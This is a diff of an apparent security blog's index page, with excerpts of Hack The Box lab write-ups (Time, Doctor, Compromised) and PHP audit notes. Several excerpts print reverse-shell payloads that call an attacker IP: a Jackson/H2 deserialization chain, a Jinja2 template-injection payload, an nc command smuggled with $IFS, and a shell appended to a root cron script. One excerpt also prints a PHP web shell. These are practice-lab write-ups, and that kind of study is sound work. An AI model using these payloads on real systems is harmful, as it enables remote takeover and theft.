@@ -103,383 +103,6 @@
 	   
 	<div class="article-header">
 	    
-		<a  class="title" href="/2020/11/13/HTB-Academy/">HTB Academy Writeup</a>  
-	       
-		 
-
-		<div class='meta'>
-			<time>Nov 13, 2020</time>			
-		</div>
-	</div>
-
-
-	
-
-    
-	<div class="typo article-excerpt">	
-		
-			<p><img src="/images/HTB-Academy/image-20201108123205427.png" alt="image-20201108123205427"></p>
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
-			            
-				<a class="link" href="/tags/easy/">easy</a>           
-			
-		
-	</div>
-
-	<div class='article-bottom'>
-		<a class="readmore" href="/2020/11/13/HTB-Academy/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
-		<a  class="title" href="/2020/11/07/HTB-Time/">HTB Time Writeup</a>  
-	       
-		 
-
-		<div class='meta'>
-			<time>Nov 07, 2020</time>			
-		</div>
-	</div>
-
-
-	
-		<div class="thumb">
-			<div class="banner"  data-origin="/images/HTB-Time/image-20201107200513767.png"></div>
-		</div>
-	
-
-    
-	<div class="typo article-excerpt">	
-		 
-			<p><img src="/images/HTB-Time/image-20201107200513767.png" alt="image-20201107200513767"></p>
-<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 20:06 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.214</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Online JSON parser</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.06 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>Start to enumerate at the <em>http</em> port</p>
-<p>Not able to find other directory other than the index page</p>
-<p><img src="/images/HTB-Time/image-20201107200901834.png" alt="image-20201107200901834"></p>
-<p>Guess this is the only route to <em>user</em></p>
-<p>Tried different input</p>
-<p><img src="/images/HTB-Time/image-20201107201052773.png" alt="image-20201107201052773"></p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Validation failed: Unhandled Java exception: com<span class="selector-class">.fasterxml</span><span class="selector-class">.jackson</span><span class="selector-class">.core</span><span class="selector-class">.JsonParseException</span>: Unrecognized token <span class="string">&#x27;test&#x27;</span>: was expecting <span class="string">&#x27;null&#x27;</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span> or NaN</span><br></pre></td></tr></table></figure>
-
-<p>Found some error message.</p>
-<p>After googling, with the keyword <em>fasterxml and jackson</em></p>
-<p>we found this <a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-12384">CVE</a></p>
-<p>Create a <em>inject.sql</em> with bash reverse shell</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        String[] command <span class="operator">=</span> &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(command).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>Start a python server</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
-
-<p>Also start a listner</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure>
-
-<p>Finally our payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;</span>,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://x.x.x.x/inject.sql&#x27;&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
-
-<p>​	And we got our reverse shell back</p>
-<p><img src="/images/HTB-Time/image-20201107204418416.png" alt="image-20201107204418416"></p>
-<h1 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h1><p>After some enumeration manage to find something interesting using <strong>PSPY64</strong></p>
-<p><img src="/images/HTB-Time/image-20201107194832954.png" alt="image-20201107194832954"></p>
-<p> <strong>&#x2F;usr&#x2F;bin&#x2F;timer_backup.sh</strong> is run by Root</p>
-<p><code>-rwxrw-rw- 1 pericles pericles 88 Nov  7 12:50 /usr/bin/timer_backup.sh</code></p>
-<p>We have write permission.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.22/5555 0&gt;&amp;1&quot;</span> &gt;&gt; /usr/bin/timer_backup.sh</span><br></pre></td></tr></table></figure>
-
-<p>and we get a easy root. But the nc will exit somehow less than 30second, another method is to write your public key and enter in SSH</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.10.214] 33944</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (230926): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@time:/<span class="comment"># whoami &amp;&amp; id &amp;&amp; hostname</span></span><br><span class="line"><span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span> &amp;&amp; hostname</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">time</span><br><span class="line">root@time:/<span class="comment"># exit</span></span><br></pre></td></tr></table></figure>
-
-<br/>
-<br/>
-<br/>
-
-<p><img src="/images/root.gif" alt="root"></p>
-
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
-			            
-				<a class="link" href="/tags/medium/">medium</a>           
-			
-		
-	</div>
-
-	<div class='article-bottom'>
-		<a class="readmore" href="/2020/11/07/HTB-Time/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
-		<a  class="title" href="/2020/10/06/HTB-Doctor/">HTB Doctor Writeup</a>  
-	       
-		 
-
-		<div class='meta'>
-			<time>Oct 06, 2020</time>			
-		</div>
-	</div>
-
-
-	
-
-    
-	<div class="typo article-excerpt">	
-		 
-			<p><img src="/images/HTB-Doctor/image-20201009214428794.png" alt="image-20201009214428794"></p>
-<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author Ikonw"></a>Author Ikonw</h2><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun Sep 27 09:39:47 2020 as: nmap -Pn -sCV -p22,80,8089 -oN nmap/Full_10.129.11.0.nmap 10.129.11.0</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> doctor.htb (10.129.11.0)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089/tcp open  ssl/http Splunkd httpd</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Splunkd</span><br><span class="line">|_http-title: splunkd</span><br><span class="line">| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">|_Not valid after:  2023-09-06T15:57:27</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>Start enumeration on port 80, found the <code>info@doctors.htb</code> email.</p>
-<p>Let’s add the hostname <code>doctors.htb</code> to <code>/etc/hosts</code></p>
-<p><img src="/images/HTB-Doctor/image-20201009214518677.png" alt="image-20201009214518677"></p>
-<p>After adding to host file, visit <code>doctors.htb</code> come to a login page</p>
-<p><img src="/images/HTB-Doctor/image-20201009214618490.png" alt="image-20201009214618490"></p>
-<p>Tried to use <code>info@doctors.htb</code> to login, with the reset password function, we can verify that <code>info@doctors.htb</code> is not a valid account.</p>
-<p><img src="/images/HTB-Doctor/image-20201009214740397.png" alt="image-20201009214740397"></p>
-<p>Once we register, there’s only one function. </p>
-<p><img src="/images/HTB-Doctor/image-20201009214919652.png" alt="image-20201009214919652"></p>
-<p>From the page source, we found <code>/archive</code> but it appears to be blank page </p>
-<p><img src="/images/HTB-Doctor/image-20201009214950290.png" alt="image-20201009214950290"></p>
-<p>The <code>New Post</code> is vulnerable to <code>server site template injection</code></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Server Side Template Injection Payloads</a></p>
-<p><img src="/images/HTB-Doctor/image-20201009220337033.png" alt="image-20201009220337033"></p>
-<p>When we input <code>&#123;&#123;7*7&#125;&#125;</code> , we notice that it is shown on the <code>/archive</code> page.</p>
-<p>can confirmed that it is using either <code>Twig</code> or <code>Jinja2</code></p>
-<p>Next up, craft a malicious payload to obtain reverse connecction</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> <span class="string">&quot;warning&quot;</span> <span class="keyword">in</span> x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.67\&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;, \&quot;-i\&quot;]);&#x27;&quot;</span>).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Another way would be using malicious curl command, this seems the unintended way</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;img src=http://10.10.14.67:1337/$(nc.traditional<span class="variable">$IFS</span>-e<span class="variable">$IFS</span>/bin/bash<span class="variable">$IFS</span><span class="string">&#x27;10.10.14.67&#x27;</span><span class="variable">$IFS</span><span class="string">&#x27;4444&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/HTB-Doctor/image-20201010132416445.png" alt="image-20201010132416445"></p>
-<h1 id="WWW-data-to-User"><a href="#WWW-data-to-User" class="headerlink" title="WWW-data to User"></a>WWW-data to User</h1><p>Went to <code>/home</code> directory we found user <code>shaun</code></p>
-<p>Found user password in <code>/var/log/apache/backup</code></p>
-<p>And we can switch to user <code>shaun</code>.</p>
-<p>Using the privilege escalation suggester we got the splunk is vulnerable. </p>
-<p>By using the <a target="_blank" rel="noopener" href="https://github.com/cnotin/SplunkWhisperer2">https://github.com/cnotin/SplunkWhisperer2</a> we are able to get privileges’ to root </p>
-<p>Initial foothold is more annoying, from www-data to user to root is easy</p>
-<br/>
-<br/>
-<br/>
-
-<p><img src="/images/root.gif" alt="root"></p>
-
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
-			            
-				<a class="link" href="/tags/easy/">easy</a>           
-			
-		
-	</div>
-
-	<div class='article-bottom'>
-		<a class="readmore" href="/2020/10/06/HTB-Doctor/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
-		<a  class="title" href="/2020/09/25/PHP-audit-lab%20day3/">PHP::in_array() Type Juggling</a>  
-	       
-		 
-
-		<div class='meta'>
-			<time>Sep 25, 2020</time>			
-		</div>
-	</div>
-
-
-	
-
-    
-	<div class="typo article-excerpt">	
-		 
-			<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$className</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$className</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$controllerName</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">class_exists</span>(<span class="variable">$controllerName</span>)) &#123;</span><br><span class="line">    <span class="variable">$controller</span> = <span class="keyword">new</span> <span class="variable">$controllerName</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$controller</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;There is no page with this name&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;new&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;controller rendering new response&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;controller rendering old response&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>First vulnerability in line 9, according to PHP manual.</p>
-<p>#class_exists</p>
-<p><code>class_exists</code> - This function checks whether or not the given class has been definded</p>
-<blockquote>
-<p>class_exists ( string $class_name, bool $autoload &#x3D; true) : bool</p>
-</blockquote>
-<p>##Parameter</p>
-<p><code>class_name</code><br>   The class name. THe name is matched in a case-insensitive manner.</p>
-<p><code>auto_load</code><br>   Whether or not to call __autoload by default</p>
-<p>In this case, the <code>class_exists</code> function will check if the controller name we pass in is a valid, but it will first have to called the autoload function making sure all the function is loaded. When this happens, it actually includes the unknown <code>$classname</code> parameter we passed in.</p>
-
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/php-audit/">php-audit</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/PHP-in-array-type-juggling/">PHP,in_array(),type-juggling</a>           
-			
-		
-	</div>
-
-	<div class='article-bottom'>
-		<a class="readmore" href="/2020/09/25/PHP-audit-lab%20day3/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
-		<a  class="title" href="/2020/09/25/PHP%5E%25%5E%25in_array()-Type%20Juggling/">PHP::in_array() Type Juggling</a>  
-	       
-		 
-
-		<div class='meta'>
-			<time>Sep 25, 2020</time>			
-		</div>
-	</div>
-
-
-	
-
-    
-	<div class="typo article-excerpt">	
-		
-			<p>PHP often known as a ‘loosely typed’ programming language</p>
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/php-audit/">php-audit</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/PHP-in-array-type-juggling/">PHP,in_array(),type-juggling</a>           
-			
-		
-	</div>
-
-	<div class='article-bottom'>
-		<a class="readmore" href="/2020/09/25/PHP%5E%25%5E%25in_array()-Type%20Juggling/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
 		<a  class="title" href="/2020/09/23/PHP%5E%25%5E%25Preg_replace()-RCE/">PHP::Preg_replace() RCE</a>  
 	       
 		 
@@ -522,6 +145,909 @@
 
 	<div class='article-bottom'>
 		<a class="readmore" href="/2020/09/23/PHP%5E%25%5E%25Preg_replace()-RCE/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/09/21/HTB-fortress-Jet/">HTB Jet Fortress writeup</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Sep 21, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		
+			Active Password Protected writeup
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		            
+				<a class="link" href="/categories/hackthebox/fortress/">fortress</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/fortress/">fortress</a>           
+			            
+				<a class="link" href="/tags/enumeration/">enumeration</a>           
+			            
+				<a class="link" href="/tags/dns-enumeration/">dns enumeration</a>           
+			            
+				<a class="link" href="/tags/dig/">dig</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/09/21/HTB-fortress-Jet/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/09/19/HTB-fortress-akerva/">HTB Akerva Fortress writeup (Password protected)</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Sep 19, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		
+			Active Password Protected writeup
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		            
+				<a class="link" href="/categories/hackthebox/fortress/">fortress</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/fortress/">fortress</a>           
+			            
+				<a class="link" href="/tags/enumeration/">enumeration</a>           
+			            
+				<a class="link" href="/tags/cve/">cve</a>           
+			            
+				<a class="link" href="/tags/scripting/">scripting</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/09/19/HTB-fortress-akerva/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/09/17/HTB-Compromised/">HTB Compromised Writeup</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Sep 17, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/HTB-Compromised-Hard/image-20200917153421555.png" alt="image-20200917153421555"></p>
+<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan:"></a>Nmap Scan:</h3><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Thu Sep 17 12:32:35 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.10.10.207.nmap 10.10.10.207</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.207</span></span><br><span class="line">Host is up (<span class="number">0.13</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span>ubuntu0<span class="number">.3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">6</span>e:da:<span class="number">5</span>c:<span class="number">8</span>e:<span class="number">8</span>e:fb:<span class="number">8</span>e:<span class="number">75</span>:<span class="number">27</span>:<span class="number">4</span><span class="keyword">a</span>:b9:<span class="number">2</span><span class="keyword">a</span>:<span class="number">59</span>:cd:<span class="number">4</span>b:cb (RSA)</span><br><span class="line">|   <span class="number">256</span> d5:c5:b3:<span class="number">0</span>d:c8:b6:<span class="number">69</span>:e4:fb:<span class="number">13</span>:a3:<span class="number">81</span>:<span class="number">4</span><span class="keyword">a</span>:<span class="number">15</span>:<span class="number">16</span>:d2 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">35</span>:<span class="number">6</span><span class="keyword">a</span>:ee:af:dc:f8:<span class="number">5</span>e:<span class="number">67</span>:<span class="number">0</span>d:bb:f3:ab:<span class="number">18</span>:<span class="number">64</span>:<span class="number">47</span>:<span class="number">90</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span>    Apache httpd <span class="number">2.4</span><span class="number">.29</span> ((Ubuntu))</span><br><span class="line">|<span class="title">_http-server-header</span>: Apache/<span class="number">2.4</span><span class="number">.29</span> (Ubuntu)</span><br><span class="line">| <span class="keyword">http</span>-title: Legitimate Rubber Ducks | Online Store</span><br><span class="line">|_Requested resource was <span class="keyword">http</span>://<span class="number">10.10</span><span class="number">.10</span><span class="number">.207</span>/shop/en/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report <span class="keyword">any</span> incorrect results <span class="keyword">at</span> <span class="keyword">https</span>://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Thu Sep 17 12:32:47 2020 -- 1 IP address (1 host up) scanned in 12.01 seconds</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Port 80 webserver was a online store</p>
+<p>As usual, launch gobuster enumerate potential directories</p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200917153449369.png" alt="image-20200917153449369"></p>
+<p>Found a backup directory, I believe it’s the source code for the web</p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200917153509156.png" alt="image-20200917153509156"></p>
+<p>search for the keyword <code>username</code> to look for potential plaintext username or hard coded password </p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grep</span> -R <span class="string">&#x27;username|password&#x27;</span> |<span class="keyword">grep</span> -v <span class="string">&#x27;jquery&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>and we found login.php have suspicious <code>file_put_contents</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(user::<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])) notices::<span class="title function_ invoke__">add</span>(<span class="string">&#x27;notice&#x27;</span>, language::<span class="title function_ invoke__">translate</span>(<span class="string">&#x27;text_already_logged_in&#x27;</span>, <span class="string">&#x27;You are already logged in&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">  <span class="comment">//file_put_contents(&quot;./.log2301c9430d8593ae.txt&quot;, &quot;User: &quot; . $_POST[&#x27;username&#x27;] . &quot; Passwd: &quot; . $_POST[&#x27;password&#x27;]);</span></span><br><span class="line">  user::<span class="title function_ invoke__">login</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$redirect_url</span>, <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;remember_me&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;remember_me&#x27;</span>] : <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Navigate to the location and we got the user and passwd</p>
+<p><code>admin:theNextGenSt0r3!~</code></p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200917153549898.png" alt="image-20200917153549898"></p>
+<p>Login to the authentication portal, we got the LiteCart version number</p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200917153639177.png" alt="image-20200917153639177"></p>
+<p>And yeah, we got the poc </p>
+<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line"> <span class="comment">Exploit Title                                                                                                                                                                                           |  Path</span></span><br><span class="line"><span class="literal">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line"><span class="comment">LiteCart 2</span><span class="string">.</span><span class="comment">1</span><span class="string">.</span><span class="comment">2</span> <span class="literal">-</span> <span class="comment">Arbitrary File Upload                                                                                                                                                                   | php/webapps/45267</span><span class="string">.</span><span class="comment">py</span></span><br><span class="line"><span class="literal">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p>The initial exploit was not able to work, it was able to create a php file, but <code>system</code> seems disable. Tried different shell execution function like <code>shell_exec</code> didnt work either. </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>] ) ) &#123; <span class="title function_ invoke__">system</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>] . <span class="string">&#x27; 2&gt;&amp;1&#x27;</span> ); &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Instead of continuing try for luck, <code>phpinfo()</code> will give us what function is disabled. And we got tons of function being disabled</p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200918141630991.png" alt="image-20200918141630991"></p>
